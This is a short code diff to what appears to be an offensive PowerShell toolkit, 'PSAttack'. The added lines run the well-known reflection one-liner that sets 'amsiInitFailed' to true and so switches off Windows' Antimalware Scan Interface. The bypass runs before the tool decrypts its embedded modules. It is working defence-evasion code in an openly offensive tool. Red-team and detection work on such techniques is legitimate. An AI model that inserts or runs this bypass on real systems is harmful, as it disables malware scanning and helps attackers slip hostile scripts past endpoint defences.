@@ -26,6 +26,20 @@ namespace PSAttack
             AttackState attackState = new AttackState();
             attackState.cursorPos = Display.createPrompt(attackState).Length;
 
+            // AMSI bypass care of @mattifestion (https://twitter.com/mattifestation/status/735261120487772160)
+            if (Environment.OSVersion.Version.Major > 9)
+            {
+                try
+                {
+                    attackState.cmd = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
+                    Processing.PSExec(attackState);
+                }
+                catch
+                {
+                    Console.Write("Could not run AMSI bypass.");
+                }
+            }
+
             // Decrypt modules
             Assembly assembly = Assembly.GetExecutingAssembly();
             string[] resources = assembly.GetManifestResourceNames();
